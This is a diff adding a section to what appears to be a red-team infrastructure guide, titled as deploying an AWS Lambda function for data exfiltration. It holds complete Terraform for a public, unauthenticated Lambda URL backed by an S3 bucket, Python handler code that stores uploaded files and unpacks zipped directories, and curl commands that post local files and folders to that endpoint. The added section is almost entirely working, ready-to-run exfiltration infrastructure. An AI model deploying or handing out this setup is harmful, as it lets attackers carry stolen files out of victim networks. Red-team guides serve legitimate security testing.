@@ -7,6 +7,8 @@ This document contains guidelines on deploying infrastructure that can be useful
 - [Deploying a secure static website via AWS S3 and CloudFront](#deploying-a-secure-static-website-via-aws-s3-and-cloudfront)
 - [Deploy a Static Website via GitHub Pages](#deploy-a-static-website-via-github-pages)
 - [Maintain persistent access with Tailscale](#maintain-persistent-access-with-tailscale)  
+- [Deploy a Lambda function for data exfiltration](#deploy-a-lambda-function-for-data-exfiltration)  
+
 
 ## Deploying a secure static website via AWS S3 and CloudFront  
 
@@ -301,5 +303,206 @@ compromised machine inside the customer private network (you can use IP address 
 
 
   
+
+## Deploy a Lambda function for data exfiltration  
+
+The following Terraform configuration enables the seamless, on-demand deployment of a disposable, public serverless listener that can be leveraged for data exfiltration during red teaming campaigns.    
+The exfiltrated files are then stored on an S3 bucket: you can upload any single file (e.g., text, binary, images, etc.) or full directories (the directory tree will be preserved).  
+
+
+main.tf:  
+```hcl
+provider "aws" {
+  region = "eu-north-1"
+}
+
+resource "aws_iam_role" "lambda_role" {
+  name = "lambda_s3_execution_role"
+  assume_role_policy = jsonencode({
+    Version = "2012-10-17",
+    Statement = [
+      {
+        Action = "sts:AssumeRole",
+        Effect = "Allow",
+        Principal = {
+          Service = "lambda.amazonaws.com"
+        }
+      }
+    ]
+  })
+}
+
+resource "aws_iam_policy" "lambda_policy" {
+  name = "lambda_s3_access_policy"
+  policy = jsonencode({
+    Version = "2012-10-17",
+    Statement = [
+      {
+        Effect = "Allow",
+        Action = "s3:PutObject",
+        Resource = "arn:aws:s3:::${aws_s3_bucket.exfil_bucket.bucket}/*"
+      },
+      {
+        Effect = "Allow",
+        Action = "logs:*",
+        Resource = "arn:aws:logs:*:*:*"
+      }
+    ]
+  })
+}
+
+resource "aws_iam_role_policy_attachment" "lambda_policy_attach" {
+  role       = aws_iam_role.lambda_role.name
+  policy_arn = aws_iam_policy.lambda_policy.arn
+}
+
+resource "aws_s3_bucket" "exfil_bucket" {
+  bucket = "data-exfiltration-bucket-${random_string.suffix.result}"
+  
+  force_destroy = true
+
+  tags = {
+    Name = "DataExfilBucket"
+  }
+}
+
+resource "random_string" "suffix" {
+  length  = 6
+  special = false
+  upper   = false
+  lower   = true
+  numeric = true
+}
+
+data "archive_file" "lambda_zip" {
+  type        = "zip"
+  source_dir  = "${path.module}/lambda_function"
+  output_path = "${path.module}/lambda_function_payload.zip"
+}
+
+resource "aws_lambda_function" "exfil_lambda" {
+  function_name = "DataExfiltrationFunction"
+  handler       = "lambda_function.lambda_handler"
+  role          = aws_iam_role.lambda_role.arn
+  runtime       = "python3.9"
+
+  filename = data.archive_file.lambda_zip.output_path
+
+  environment {
+    variables = {
+      BUCKET_NAME = aws_s3_bucket.exfil_bucket.bucket
+    }
+  }
+
+  tags = {
+    Name = "DataExfiltrationLambda"
+  }
+}
+
+resource "aws_lambda_function_url" "lambda_url" {
+  function_name       = aws_lambda_function.exfil_lambda.function_name
+  authorization_type  = "NONE"
+}
+
+resource "aws_lambda_permission" "public_lambda_url_permission" {
+  statement_id  = "AllowPublicAccess"
+  action        = "lambda:InvokeFunctionUrl"
+  function_name = aws_lambda_function.exfil_lambda.function_name
+  principal     = "*"
+  function_url_auth_type = "NONE"
+}
+
+output "lambda_function_url" {
+  value = aws_lambda_function_url.lambda_url.function_url
+}
+```  
+
+Lambda function code (python):
+```python
+import boto3
+import os
+import time
+import zipfile
+import io
+import base64
+
+s3 = boto3.client('s3')
+bucket_name = os.environ['BUCKET_NAME']
+
+def lambda_handler(event, context):
+    try:
+        # If the body is base64 encoded, decode it
+        if event.get("isBase64Encoded", False):
+            file_content = base64.b64decode(event['body'])
+        else:
+            file_content = event['body'].encode('utf-8')
+
+        # Get the filename from headers (or set a default)
+        filename = event['headers'].get('filename', f"exfiltrated-file-{time.strftime('%Y-%m-%d-%H-%M-%S', time.gmtime())}")
+
+        # Check if the file is a zip (assume directory if it is a zip file)
+        if filename.endswith(".zip"):
+            # Treat it as a compressed directory
+            handle_zip(file_content, filename)
+        else:
+            # It's a single file, upload directly
+            upload_file_to_s3(file_content, filename)
+
+        return {
+            'statusCode': 200,
+            'body': f"File {filename} stored successfully"
+        }
+
+    except Exception as e:
+        return {
+            'statusCode': 500,
+            'body': f"Error: {str(e)}"
+        }
+
+def upload_file_to_s3(file_content, filename):
+    """Helper function to upload a file to S3"""
+    s3.put_object(Bucket=bucket_name, Key=filename, Body=file_content)
+
+def handle_zip(file_content, zip_filename):
+    """Helper function to handle a zip file by extracting and uploading its contents"""
+    with io.BytesIO(file_content) as zip_buffer:
+        with zipfile.ZipFile(zip_buffer, 'r') as zip_ref:
+            for file_info in zip_ref.infolist():
+                # Skip directories, only process files
+                if not file_info.is_dir():
+                    # Extract the file from the zip
+                    with zip_ref.open(file_info) as extracted_file:
+                        file_data = extracted_file.read()
+                        # Upload each file to S3 with its full path
+                        upload_file_to_s3(file_data, file_info.filename)
+
+```  
+
+Launch deployment:  
+```sh
+terraform init && terraform plan && terraform apply
+```  
+Once the deployment is complete, terraform will output the public lambda url, for example:  
+```sh
+lambda_function_url = "https://aue3zpxtqtiwb7uvr52crjo2ru0xcrme.lambda-url.eu-north-1.on.aws/"
+```  
+Now you can proceede to exfiltrate files and directories.
+Example for single file:  
+```sh
+curl -X POST https://aue3zpxtqtiwb7uvr52crjo2ru0xcrme.lambda-url.eu-north-1.on.aws -H "filename: test_single_file.txt" --data-binary @test_single_file.txt
+```  
+
+Example for a directory:
+```sh
+zip -r test_folder.zip test_folder \
+&& curl -X POST https://aue3zpxtqtiwb7uvr52crjo2ru0xcrme.lambda-url.eu-north-1.on.aws -H "filename: test_folder.zip" --data-binary @test_folder.zip
+```  
+
+You can later retrieve all the exfiltrated files from the S3 bucket:  
+![data](./images/s3-data-exfiltration.png)  
+
+
+
+
 
 
